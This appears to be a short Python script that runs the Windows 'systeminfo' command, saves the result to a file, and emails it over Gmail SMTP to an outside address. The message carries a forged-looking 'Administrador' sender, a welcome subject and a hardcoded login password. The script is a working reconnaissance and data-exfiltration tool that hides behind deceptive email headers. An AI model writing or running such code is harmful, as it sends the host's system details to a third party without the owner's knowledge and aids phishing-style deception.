from smtplib import SMTP_SSL, SMTPException
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.encoders import encode_base64
import subprocess, os

email_from = 'soporte@ifywerz.com.mx'
email_to = 'ifywerz@dominio.com'

try:
   response = subprocess.run("systeminfo", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
   with open("init.txt", "bw") as f:
      for c in response.stdout:
         f.write(chr(c).encode())
      print("Se ha generado el archivo.")
         
except Exception as e:
   print(e)
   
emisor = "From: Administrador <soporte@ifywerz2.com.mx>: "
destinatario = "To, Jonathan: amigo <client@gmail.com.mx>"
asunto = "Bienvenido: "
mensaje = "<a href='https://www.google.com'>Ir</a>"
archivo = os.path.join(os.getcwd(), "init.txt")


header = MIMEMultipart()
header['Subject'] = asunto
header['From'] = emisor
header['To'] = destinatario

mensaje = MIMEText(mensaje, 'html')
header.attach(mensaje)

if (os.path.isfile(archivo)):
   adjunto = MIMEBase('application','octet-stream')
   adjunto.set_payload(open(archivo, "rb").read())
   adjunto.add_header('Content-Disposition', 'attachment; filename={0}'.format(os.path.basename(archivo)))
   encode_base64(adjunto)
   header.attach(adjunto)

try:
   servidor = SMTP_SSL(host='smtp.gmail.com', port=465)
   #servidor.starttls()
   servidor.login('ifywerz@dominio.com','1__jbmzkkvgudmmkuhk_1212')
   servidor.sendmail(email_from, email_to, header.as_string())         
   print("Se ha enviado el correo.")
except SMTPException as e:
   print(e)
